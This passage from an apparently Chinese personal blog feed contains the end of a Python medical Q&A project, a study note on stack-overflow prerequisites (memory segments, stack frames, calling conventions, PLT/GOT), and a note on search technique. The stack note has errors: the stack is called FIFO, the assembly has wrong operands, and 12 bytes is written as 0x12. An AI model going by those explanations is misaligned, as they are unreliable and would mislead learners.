title="问题分析"></a>问题分析</h4><p>question_parser.py在问题分类后对问题进行分析。</p><p>parser_main根据问题分类结果获取问题中的特征词及问题类型。build_entitydict从问题分类的返回结果进行整理返回一个参数字典。sql_transfer使用neo4j的cypher查询语言根据参数字典返回查询语句并整理组合查询语句。</p><h4 id="信息查询"><a href="#信息查询" class="headerlink" title="信息查询"></a>信息查询</h4><p>answer_search.py负责查询neo4j中的信息并对返回信息进行整理。</p><p>init连接neo4j。search_main接收问题分析部分返回的cypher查询语句并执行查询语句去获取查询结果。answer_prettify调用相应的回复模板将之前查询到的结果与模板进行结合返回问题的答案。</p><h3 id="项目优化"><a href="#项目优化" class="headerlink" title="项目优化"></a>项目优化</h3><h4 id="实体填充"><a href="#实体填充" class="headerlink" title="实体填充"></a>实体填充</h4><p>用户提问时可能会发生这种情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户：感冒怎么治？</span><br><span class="line">性感小高，在线解惑：可以xxxxxxx。</span><br><span class="line">用户：那要吃什么药？</span><br><span class="line">性感小高，在线解惑：可以吃xxxxxxx</span><br></pre></td></tr></table></figure><p>未优化前第二次提问时因为关键词不够会默认回答，优化后就会采用第一次提问时的特征词，这里是感冒，默认问题为感冒要吃什么药？也就有了回答。</p><p>优化可以在question_classifier.py的check_medical函数里增加全局变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">global diseases_dict</span><br><span class="line">if final_dict:</span><br><span class="line">    diseases_dict = final_dict</span><br></pre></td></tr></table></figure><p>并在classify函数中加入以下代码自动判断实体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if not medical_dict:</span><br><span class="line">    if &#x27;diseases_dict&#x27; in globals():    # 判断是否是首次提问，若首次提问，则diseases_dict无值</span><br><span class="line">        medical_dict = diseases_dict</span><br><span class="line">    else:</span><br><span class="line">        return &#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="属性增加"><a href="#属性增加" class="headerlink" title="属性增加"></a>属性增加</h4><p>该项目的一个瑕疵是属性划分，属性划分不够细致，可以通过精细属性划分来进行优化，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户：感冒发烧流鼻涕可以吃什么药？</span><br><span class="line">性感小高，在线解惑：感冒灵，板蓝根，双黄连口服液·······</span><br><span class="line">用户：感冒发烧流鼻涕可以吃什么药？</span><br><span class="line">性感小高，在线解惑：感冒灵······</span><br></pre></td></tr></table></figure><p>第二个回答要比第一个回答更精准，因为属性划分不细致的话就会返回符合少数属性的所有答案，当属性划分更精细后返回的答案会变少也更加精准。</p><p>这里可以增加一个推荐食品的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 推荐食品</span><br><span class="line">if self.check_words(self.food_qwds, question) and &#x27;disease&#x27; in types:</span><br><span class="line">    deny_status = self.check_words(self.deny_words, question)</span><br><span class="line">    if deny_status:</span><br><span class="line">        question_type = &#x27;disease_not_food&#x27;</span><br><span class="line">    else:</span><br><span class="line">        question_type = &#x27;disease_do_food&#x27;</span><br><span class="line">    if self.check_words([&#x27;能吃&#x27;,&#x27;能喝&#x27;,&#x27;可以吃&#x27;,&#x27;可以喝&#x27;], question):</span><br><span class="line">        question_types.append(&#x27;disease_can_eat&#x27;)</span><br><span class="line">    print(question_type)</span><br><span class="line">    question_types.append(question_type)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>出于能力和时间问题到此为止，对这种项目的创建感觉更依赖于数据是否完善，而且该项目还是一个封闭项目(问题答案有限)，可以直接查找数据即可，但信息查询和返回时可以对进行优化，比如优化算法使其对回答结果更加精准。另外个人猜测如果非封闭项目能够做到与搜索引擎结合是不是就可以大幅度提高答案的准确率与可回答问题的数量？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;python期末项目学习记录&lt;/p&gt;</summary>
    
    
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出类漏洞前置基础知识</title>
    <link href="http://example.com/2021/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://example.com/2021/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</id>
    <published>2021-06-05T12:44:03.000Z</published>
    <updated>2021-06-05T12:48:49.200Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>栈溢出类漏洞前置基础知识。</p><span id="more"></span><h1 id="溢出类漏洞基础前置知识："><a href="#溢出类漏洞基础前置知识：" class="headerlink" title="溢出类漏洞基础前置知识："></a>溢出类漏洞基础前置知识：</h1><h2 id="计算机系统中各段："><a href="#计算机系统中各段：" class="headerlink" title="计算机系统中各段："></a>计算机系统中各段：</h2><p>早期的计算机中程序都是直接运行在物理内存上的，运行时访问的地址都是物理地址，这要求程序使用的内存空间不超过物理内存的大小。现代计算机操作系统中为了提高CPU的利用率计算机同时运行多个程序，并将计算机上有限的物理内存分配给多个程序使用，做到隔离各个程序的地址空间和提高内存利用率，操作系统应用虚拟内存机制来管理内存。简单来说现代计算机如果要运行一个程序，程序需要在虚拟内存中加载运行，这一部分简单介绍操作系统的虚拟内存空间中的各段布局和作用。要详细理解虚拟内存可参考《深入理解计算机系统》、《程序员的自我修养-链接装载库》、linux的虚拟内存可参考《linux二进制分析》。</p><p>计算机系统虚拟内存中各段布局简略图：堆空间和数据段之间还有一个bss段以及其他部分，此图为简略图。</p><p><img src="/2021/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20210213132407552.png" alt="image-20210213132407552"></p><p><img src="/2021/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20210213133003287.png" alt="image-20210213133003287"></p><p>关于虚拟内存这一块细讲东西太多，这里只记录与溢出有关的bss段、data段、text段、heap段、stack段的基本介绍：</p><h3 id="bss段："><a href="#bss段：" class="headerlink" title="bss段："></a>bss段：</h3><p>bss段通常是指用来存放程序中未初始化的全局变量的一块内存区域，也存放初始化但数据为0的全局变量，是英文Block Started by Symbol的简称。bss段属于静态内存分配。 </p><h3 id="data段："><a href="#data段：" class="headerlink" title="data段："></a>data段：</h3><p>data段通常是指用来存放程序中已初始化的全局变量的一块内存区域。属于静态内存分配。 </p><h3 id="text段："><a href="#text段：" class="headerlink" title="text段："></a>text段：</h3><p>代码段通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。代码段中也有可能包含一些只读的常数变量，如字符串常量等。 </p><h3 id="heap段："><a href="#heap段：" class="headerlink" title="heap段："></a>heap段：</h3><p>堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p><h3 id="stack段："><a href="#stack段：" class="headerlink" title="stack段："></a>stack段：</h3><p>栈又称堆栈，是用户存放程序临时创建的局部变量，也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。此外函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的先进先出(FIFO)特点，所以栈特别方便用来保存/恢复调用现场。我们可以把堆栈看成一个寄存、交换临时数据的内存区。 </p><hr><p><strong>一个程序本质上都是由 bss段、data段、text段三个组成的。</strong></p><p>bss段通常是指用来存放程序中未初始化的全局变量的一块内存区域，一般在初始化时bss 段部分将会清零。bss段属于静态内存分配，即程序一开始就将其清零了。如在C语言之类的程序编译完成之后，已初始化的全局变量保存在.data 段中，未初始化的全局变量保存在.bss 段中。text和data段都在可执行文件中（在嵌入式系统里一般是固化在镜像文件中），由系统从可执行文件中加载；而bss段不在可执行文件中，由系统初始化。</p><p>bss段和data段的区别主要在于：</p><p>全局的未初始化变量存在于bss段中，具体体现为一个占位符，并不给该段的数据分配空间，只是记录数据所需空间的大小，全局的已初始化变量存于data段中，而函数内的自动变量都在栈上分配空间。</p><p>bss段不占用文件空间，其内容由操作系统初始化，data段需要占用文件空间，其内容由程序初始化。</p><p>bss段的大小从可执行文件中得到 ，然后链接器得到这个大小的内存块，紧跟在数据段后面，data段则为数据分配空间，数据保存在目标文件中，data段包含经过初始化的全局变量以及它们的值。当这个内存区进入程序的地址空间后全部清零。</p><p>包含rodata段、data段和bss段等的整个区段才是完整的数据区。</p><h2 id="函数调用及函数栈帧："><a href="#函数调用及函数栈帧：" class="headerlink" title="函数调用及函数栈帧："></a>函数调用及函数栈帧：</h2><h3 id="栈作用"><a href="#栈作用" class="headerlink" title="栈作用:"></a>栈作用:</h3><p>x86和x64计算机系统保存函数的参数、返回值、返回地址等都会用到栈，函数调用过程中通过将数据、地址压入和弹出栈来进行函数调用。</p><h3 id="栈结构："><a href="#栈结构：" class="headerlink" title="栈结构："></a>栈结构：</h3><p>栈是一种LIFO(先进后出)的数据结构，从高地址到低地址存储数据，支持push将数据压入栈和pop将栈中的数据弹出栈储存到寄存器或内存中两种操作，正好满足函数调用时父函数调用子函数，父函数在前子函数在后的要求。调用时父函数通过栈将参数传入子函数，子函数完成运算后通过栈返回返回值。</p><p>栈中包括栈帧，在调用一个函数时会建立一个新的栈帧，每个栈帧的建立和使用后处理的方式取决于操作系统和编译器。可以看做单一的栈帧对应函数调用时某个单一函数，而栈段不止用于单一的某个程序而是计算机系统中所以程序的共用部分，在研究栈溢出中我们一般通过某个栈帧来使用栈溢出。</p><h4 id="栈帧："><a href="#栈帧：" class="headerlink" title="栈帧："></a>栈帧：</h4><p>栈帧，也就是stack frame，是一种栈结构也是stack段的一部分，栈帧专门用于保存函数调用过程中的各种信息(参数，返回地址，本地变量等)。栈帧有栈顶和栈底之分，其中栈顶的地址最低，栈底的地址最高，SP(栈指针)一直指向栈顶的。BP(帧指针)也就是基址指针一直指向栈底。EP和BP一起创建和使用一个栈帧。</p><p>栈帧结构图：</p><p><img src="/2021/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20210213093352964.png" alt="image-20210213093352964"></p><p>如上，栈顶在上，地址空间从上向下生长。ESP相当于栈顶，EBP相当于栈底，如果被调用函数可以使用EAX、EBX等寄存器，而调用函数中这些寄存器的值此时还没有使用完，则栈此时还要保存EAX、EBX等寄存器的值。</p><h3 id="参数传递："><a href="#参数传递：" class="headerlink" title="参数传递："></a>参数传递：</h3><h4 id="系统函数（内核接口）："><a href="#系统函数（内核接口）：" class="headerlink" title="系统函数（内核接口）："></a>系统函数（内核接口）：</h4><h5 id="1、x86架构32位系统调用："><a href="#1、x86架构32位系统调用：" class="headerlink" title="1、x86架构32位系统调用："></a>1、x86架构32位系统调用：</h5><p>使用寄存器传递参数，eax为syscall_number(系统函数编号)，ebx、ecx、edx、edi、esi、ebp用于将6个参数传递给系统调用。返回值保存在eax中。</p><h5 id="2、x86架构64位系统调用"><a href="#2、x86架构64位系统调用" class="headerlink" title="2、x86架构64位系统调用"></a>2、x86架构64位系统调用</h5><p>使用寄存器传递参数，不直接从栈中传递任何参数，eax仍为syscall_number，使用的寄存器有rdi、rsi、rdx、r10、r8、r9.系统调用通过syscall指令完成。返回值，系统调用的结果存放在eax中。</p><h4 id="用户函数"><a href="#用户函数" class="headerlink" title="用户函数"></a>用户函数</h4><h5 id="1、x86架构32位函数调用"><a href="#1、x86架构32位函数调用" class="headerlink" title="1、x86架构32位函数调用"></a>1、x86架构32位函数调用</h5><p>使用栈传递参数，由于参数的数量不定，参数不再通过寄存器传递，最后一个参数第一个被压入栈中，直到所有参数都被压入栈中，然后执行call指令调用函数。</p><h5 id="2、x86架构64位系统调用-1"><a href="#2、x86架构64位系统调用-1" class="headerlink" title="2、x86架构64位系统调用"></a>2、x86架构64位系统调用</h5><p>寄存器与栈结合传递参数，因为内存的读写速度是有限制的，所以使用寄存器与栈结合的形式进行参数的传递工作，如果参数的类型是MEMORY，则在栈上传递参数，如果类型是INTEGER，则顺序使用rdi、rsi、rdx、rcx、r8和r9寄存器传参，如果参数多于6个，则后续参数使用栈传递，这样保障了函数的高效运行。</p><h3 id="函数调用-栈帧使用-过程："><a href="#函数调用-栈帧使用-过程：" class="headerlink" title="函数调用(栈帧使用)过程："></a>函数调用(栈帧使用)过程：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int MyFunction(int x, int y, int z)</span><br><span class="line">&#123;</span><br><span class="line">    int a, b, c;</span><br><span class="line">    a = 10;</span><br><span class="line">    b = 5;</span><br><span class="line">    c = 2;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">int TestFunction()</span><br><span class="line">&#123;</span><br><span class="line">    int x = 1, y = 2, z = 3;</span><br><span class="line">    MyFunction1(1, 2, 3);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上函数，当TestFunction函数调用MyFunction函数时，MyFunction函数汇编代码大致如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_MyFunction:</span><br><span class="line">    push %ebp            ; //保存%ebp的值</span><br><span class="line">    movl %ebp, $esp      ; //将%esp的值赋给%ebp，使新的%ebp指向栈顶</span><br><span class="line">    movl -12(%esp), %esp ; //分配额外空间给本地变量</span><br><span class="line">    movl $10, -4(%ebp)   ; </span><br><span class="line">    movl $5,  -8(%ebp)   ; </span><br><span class="line">    movl $2,  -12(%ebp)  ;</span><br></pre></td></tr></table></figure><p>这里MyFunction函数做被调用函数，TestFunction函数做调用函数，调用者首先将被调用函数的参数按照从右到左的顺序压入栈中(也不一定，如何具体使用栈上面可参考各架构的位数，这里假设只使用栈)。然后将返回地址压入栈中。这两件事一定都是调用函数负责的，压入的栈应该属于调用函数的栈帧。被调用函数也做了两件事情：首先将之前的(调用函数的) ebp压入栈，此时 esp指向它。然后将%esp的值赋给ebp, ebp就有了新的值(便于后面重新创建一个新的栈帧)，它也指向存放旧ebp的栈空间。这时它成了MyFunction函数的栈帧的栈底。这样，就保存了调用函数的ebp，并且建立了一个新的栈帧。</p><p>在ebp更新后，先分配一块0x12字节的空间用于存放本地变量，这步一般都是用sub或者mov指令实现。在这里使用的是movl。通过使用mov配合-4(%ebp), -8(%ebp)和-12(%ebp)就可以给 a、b和c 赋值了。</p><p>当上面栈中的参数使用完后被调用函数会返回返回值并返回调用函数的栈帧中，这时MyFunction函数的汇编代码大致为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MyFunction:</span><br><span class="line">    push %ebp</span><br><span class="line">    movl %esp, %ebp</span><br><span class="line">    movl -12(%esp), %esp</span><br><span class="line">    ...</span><br><span class="line">    mov %ebp, %esp</span><br><span class="line">    pop %ebp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>上述汇编代码在完成参数调用后esp移到ebp处，ebp寄存器返回到旧的ebp寄存器处恢复到调用函数的栈帧状态。ret指令相当于pop+jump。ret首先将数据(返回地址ip寄存器保存)弹出栈并保存到eip中，然后处理器根据这个地址无条件地跳到相应位置获取新的指令。此时就通过栈帧完成了一个函数的调用。</p><h3 id="函数调用约定："><a href="#函数调用约定：" class="headerlink" title="函数调用约定："></a>函数调用约定：</h3><p>在调用函数的过程中有9步：</p><p>1、调用要使用的函数，现在把调用者的地址入栈（函数返回时可继续往下执行）</p><p>2、把函数的参数压栈或者存储到寄存器中</p><p>3、调转到函数</p><p>4、把函数使用到的一些寄存器压栈</p><p>5、执行函数</p><p>6、处理函数返回值</p><p>7、对于第3步中的压栈的那些寄存器，恢复他们原来的值</p><p>8、清空第1步中的压栈参数和处理返回值</p><p>9、返回到调用者调用时的地址（步骤1已经记录）继续往下执行</p><p>函数调用约定主要定义步骤1和步骤7的规则，如何传递参数和函数调用结束后谁负责栈上数据的处理。</p><p>函数调用完成后栈中的数据并没有清空但是用户失去了访问权限，而调用结束后栈的处理方式取决于函数调用约定，函数调用约定的三个主要作用为：</p><p>1、函数参数传递的方式（是否采用寄存器传递参数、采用哪个寄存器传递参数、参数压桟的顺序等）。</p><p>2、函数调用结束后的栈指针由谁恢复（被调用的函数恢复还是调用者恢复）。</p><p>3、函数修饰名的产生方法。</p><p>常见的三种函数调用约定是cdecl，stdcall，fastcall。应用最广泛的调用方式是cdecl和stdcall。此外不常见的函数调用约定还有Pascal、thiscall等。</p><h4 id="cdecl："><a href="#cdecl：" class="headerlink" title="cdecl："></a>cdecl：</h4><p>cdecl是C/C++默认方式，采用栈传递参数，参数从从右向左入栈，由调用函数负责恢复栈顶指针，编译器在编译时会在函数名前加上一个下划线前缀生成修饰名，格式为function。如函数int Add(int a, int b)的修饰名是_Add。修饰名作用于程序链接时。在调用参数个数可变时只能采用cdecl方式，如printf函数。</p><h4 id="stdcall："><a href="#stdcall：" class="headerlink" title="stdcall："></a>stdcall：</h4><p>stdcall是Windows API默认方式，也是C++的标准调用方式，同样采用栈传递参数，参数从右向左入栈，被调用函数负责恢复栈顶指针，在输出函数名前加上一个下划线前缀，后面加上一个“@”符号和其参数的字节数，格式为function@number。如函数int Add(int a, int b)的修饰名是_Add@8。stdcall与_cdecl最主要的区别是由被调用函数清空，实际上就是将对应参数数目的数据从栈中弹出。</p><p>stdcall缺点是不能使用于那些不确定数目的函数，如printf。 优点是节省空间，因为编译出恢复栈顶的代码在函数内部只需要一份，而调用函数恢复的方式还需要在调用处编译出恢复栈顶的代码。</p><h4 id="fastcall："><a href="#fastcall：" class="headerlink" title="fastcall："></a>fastcall：</h4><p>fastcall是快速调用方式，函数的第一个和第二个(从左向右)32字节参数(或者更小的)通过ecx和edx寄存器传递，其他参数通过桟传递。从第三个参数(如果有的话)开始从右向左的顺序压栈，由被调用函数恢复栈顶指针，在函数名之前加上”@”,在函数名后面也加上“@”和参数字节数，例如@function@8。之所以叫做fastcall是因为栈位于内存区域，寄存器位于CPU内，所以存取方式快于内存。</p><h4 id="thiscall："><a href="#thiscall：" class="headerlink" title="thiscall："></a>thiscall：</h4><p>thiscall是唯一一个不能明确指明的函数修饰，因为thiscall只能用于C++类成员函数的调用，同时thiscall也是C++成员函数缺省的调用约定。由于成员函数调用还有一个this指针，因此必须特殊处理。</p><p>采用桟传递参数，参数从右向左入栈。如果参数个数确定，this指针通过ecx传递给被调用者；如果参数个数不确定，this指针在所有参数压栈后被压入堆栈。对参数个数不定的，调用函数清理堆栈，否则由被调函数清理堆栈。</p><h2 id="动态链接plt表和got表："><a href="#动态链接plt表和got表：" class="headerlink" title="动态链接plt表和got表："></a>动态链接plt表和got表：</h2><p>这部分在《程序员的自我修养-链接装载库》中有详细介绍，这里大致介绍下plt表和got表。</p><p>因为操作系统出于效率(和安全等其他方面)考虑不会在程序编译链接时就完成符号表的解析，而是等到程序真正执行前才完成所有符号表的解析，所以会使用动态链接的方法来提高程序运行的效率。在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。这样的设计就能提高程序运行的流畅度，也减少了内存空间。而且现代操作系统不允许修改代码段，只能修改数据段，所以要用到GOT表和PLT表。</p><p>获取数据段存放函数地址的那一小段代码称为PLT(Procedure Linkage Table)过程链接表存放函数地址的数据段称为GOT(Global Offset Table)全局偏移表。</p><p>plt表中的每一项的数据内容都对应的got表中的地址，plt表中的数据根本不是函数的真实地址，而是got表项的地址。在进入带有@plt标志的函数时，这个函数其实就是个过渡作用，因为got表项中的数据才是函数最终的地址，而plt表中的数据又是got表项的地址，我们就可以通过plt表跳转到got表来得到函数真正的地址。</p><p>在一个程序调用函数时，会先跳转到被调用函数的plt表处，如果该函数已经被调用过，则plt表保存的为该函数的真实内存地址，根据真实内存地址即可去调用该函数，而如果该函数未被调用过，如第一次调用scanf函数，则此时跳转流程为call scanf —&gt; scanf的plt表 —&gt;scanf的got表，在got表中能够找到scanf函数的真实内存地址供程序加载运行。</p><p>简单来说可看做：</p><p><img src="/2021/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20210213144023640.png" alt="image-20210213144023640"></p><p>plt表和got表的对应：</p><p><img src="/2021/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20210213171405028.png" alt="image-20210213171405028"></p><p>除了plt[0]、got[0]、got[1]、got[2]有特殊作用，作用全部的plt表和got表，plt[0]是一个函数，这个函数的作用是通过got[1]和got[2]来正确绑定一个函数的正式地址到对应的got表中来。剩下的如上图一一对应，被调用的函数存放在除plt[0]外的plt表其他表项中。</p><p>函数详细调用过程：</p><p><img src="/2021/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20210213173313928.png" alt="image-20210213173313928"></p><p>如图，程序调用puts函数，puts函数在glibc动态库中，编译和链接阶段链接器并不知道puts函数的加载地址也就无法向got表中填入，所以要等到进程真正运行后才能确定puts函数的地址，此时来重定位。首先函数调用还是需要进入plt表中，然后通过plt进入got表中，此时因为puts函数在该程序中还是第一次被调用并没有保存puts函数在内存中的真正地址，所以还需要通过plt表向got表写入puts函数在内存中的真实地址。此时got表中保存的还是plt中的地址(因为还需要plt表向got表中写入puts函数在内存中的真实地址)，通过got表跳转到plt表，将调用函数的id压栈，再跳转到plt表项，此时回到的plt表应该是plt[0]再进入got表，此时进入的got表应该是got[0]、got[1]然后_dl_runtime_resolve对被调用函数进行解析和重定位，最后将被调用函数的真实地址写进got表，执行完被调用函数后返回调用函数。此后再调用puts函数直接进入plt表即可。</p><p>ps：dynamic段：提供动态链接的信息，例如动态链接中各个表的位置。link_map：已加载库的链表，由动态库函数的地址构成的链表。_dl_runtime_resolve：在第一次运行时进行地址解析和重定位。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;栈溢出类漏洞前置基础知识。&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>搜索学习</title>
    <link href="http://example.com/2021/06/05/%E6%90%9C%E7%B4%A2%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/06/05/%E6%90%9C%E7%B4%A2%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-06-05T12:41:13.000Z</published>
    <updated>2021-06-05T12:48:05.620Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>写着玩的小笔记。</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之所以会记录这篇文章起初是因为今天不经意看到<a href="https://evilpan.com/2020/05/31/idcard-internal/">这篇文章</a>，开始只是简单泛读，看到一半中间被作者的搜索思想所影响学习了下(因为有时候对社工感兴趣就需要用到搜索引擎，但笔者其实连日常的学习中百度都用不好，比如我师傅看到CTF中的一道题直接找到了那道题的wp和flag而我还在嘤嘤嘤。。。)，感觉有必要学习下正经的搜索思路而不是社工中那些有关搜索引擎烂大街的使用介绍，于是和上述文章作者一样按照大佬的思路学习下搜索引擎的使用方法(主要是向大佬的思路看齐)。</p><p>OK，闲谈到此为止，下面的目标是能对身份证的芯片有个基本了解就可以了。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>大佬在他的文章中写到从对一件事情有兴趣到能真正了解那件事的完整过程，中间有3步：</p><p>1、模糊查询</p><p>2、精确搜索</p><p>3、去伪存真</p><p>这部分就用这3个步骤去进行身份证的芯片信息搜索(中间尽量带点和身份证芯片有关的知识不然除了大佬的思想什么都没学到)</p><p>模糊查询：这里我没用百度而是用的谷歌，看一下查询结果：</p><p><img src="/2021/06/05/%E6%90%9C%E7%B4%A2%E5%AD%A6%E4%B9%A0/../../../cach/image-20210525171446729.png" alt="image-20210525171446729"></p><p>第3篇文章就是上面大佬写的文章，看着红色框内的信息就挺劲爆，点进去除了画面不怎么样信息真实性也有待确定，但不得不说真的一下找到了问题的点，为什么通过身份证能确定一个人的信息？因为身份证里面的芯片，如果你对这种信息感兴趣基本这里你的问题就结束了，猜一下正常人对这种问题最终要获取的信息基本定位到为什么身份证能记录一个人的信息，只是身份证芯片，但像前面介绍的那样，我们还要继续向下挖(但这是有度的，估计一直向下挖就挖到很多的物理学知识了)，继续去搜索身份证芯片，这次的目标是要了解身份证芯片是如何能保存一个人的信息的，这次步骤过的快一点直接到精确查询，身份证芯片保存信息，这次都是没用的信息，大概是搜索问题没有设置好，先直接搜索身份证芯片保存信息的原理吧：</p><p><img src="/2021/06/05/%E6%90%9C%E7%B4%A2%E5%AD%A6%E4%B9%A0/../../../cach/image-20210525172638147.png" alt="image-20210525172638147"></p><p>也没有什么特别有用的信息，起码并没有介绍清楚身份证芯片保存信息的物理知识只是大概介绍了身份证芯片如何保存信息的，但往后翻几页就会得到你要搜索的资料，但在后面知道了这些信息：</p><p>二代身份证识别系统工作原理：</p><p>身份证信息读取器采用国际上先进的TypeB非接触IC卡阅读技术。</p><p>通过内嵌的专用身份证安全控制模块（SAM），以无线传输方式与第二代居民身份证内的专用芯片进行安全认证后，将芯片内的个人信息资料读出，再通过计算机通讯接口，将此信息上传至计算机。安装在计算机中的阅读软件，将这些信息解码成文字和相片进行显示和存储。</p><p>二代身份证识别系统的适用范围：</p><p>1、公安：身份证申领、户口登记迁移、人口管理等。旅馆：住宿登记等。</p><p>2、民政：求学、就业、参军、婚姻登记等。</p><p>3、民航：机票购买、登机等。</p><p>4、银行：开户、信用卡交易、大额取款等。</p><p>5、邮局：领取邮件汇款等。</p><p>6、电信：电话手机开户、各种通信业务等。</p><p>7、证券：股票、期货交易等。</p><p>身份证信息读取器像验钞机一样，能对身份证真伪进行有效识别，二代证内含有RFID芯片，通过二代身份证读卡器，读取身份证芯片内所存储信息，包括姓名，地址，照片等信息将一一显示，二代证芯片采用智能卡技术，是一种能判断身份证是否伪造的设备。</p><p>其芯片无法复制，高度防伪，配合身份身份证信息读取器，假身份证将无处藏身。可读取、查询第二代居民身份证全部信息,可验证第二代居民身份证真伪。</p><p>以上资料来自百度，到了这里按照大佬的思路基本知道了身份证保存个人信息的原理在于芯片内的SAM模块，按照大佬的介绍再去深入理解的话就是针对某个点去深入学习了，也就是再去搜索SAM模块，之后就是再判断下SAM模块有关的具体信息，再去深入搜索更深的点，这个过程中一定会有错误的地方，至于怎么判断错误的地方就要去查看能绝对确定信息是对的东西比如论文，之后重复上述过程直到达到你的目标，emmm，我食言了，到了这我感觉没什么意思了，所以看完大佬的文章就走了，没有记录身份证芯片有关的知识。</p><h2 id="总结"><a href="#总结" class="headerlink" 